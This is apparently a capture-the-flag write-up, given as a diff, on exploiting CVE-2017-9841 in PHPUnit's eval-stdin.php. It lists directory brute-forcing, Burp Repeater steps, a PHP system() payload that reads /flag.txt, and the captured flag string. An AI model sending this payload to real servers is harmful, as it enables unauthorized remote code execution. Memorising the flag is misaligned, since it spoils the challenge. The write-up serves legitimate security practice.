@@ -1,0 +1,24 @@
+1. Installed dirsearch by running
+git clone https://github.com/maurosoria/dirsearch.git
+cd dirsearch
+pip3 install -r requirements.txt
+
+2. Ran dirsearch with 
+python3 dirsearch.py -u http://34.179.196.165:31850 -w ./db/dicc.txt
+and discovered two interesting files: /composer.json and /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+
+3. Visited http://34.179.196.165:31850/composer.json and saw that the application was using phpunit version 5.6.2, which is vulnerable to CVE-2017-9841
+
+4. Learned that CVE-2017-9841 is a remote code execution vulnerability in PHPUnit where the eval-stdin.php file allows unauthenticated attackers to execute arbitrary PHP code by sending POST data
+
+5. Opened Burp Suite, turned Intercept on, and navigated to http://34.179.196.165:31850/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php to capture the request
+
+Burp steps: Go to proxy -> Intercept
+Turn it on and then press "Open browser"
+Paste in your link ur interested in
+http://34.179.196.165:31850/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Right click anywhere in the request window. Select "Send to Repeater". Then turn Intercept off. Go to the Repeater tab. Click Send.
+Later in repeater when you get a legit response, add this after 1 blank line
+<?php system('cat /flag.txt')?>​
+
+6. The response returned the flag CTF{8c7795c5332da1491741a61fe780006a619273444bfe54aff555e28f83e3b123}
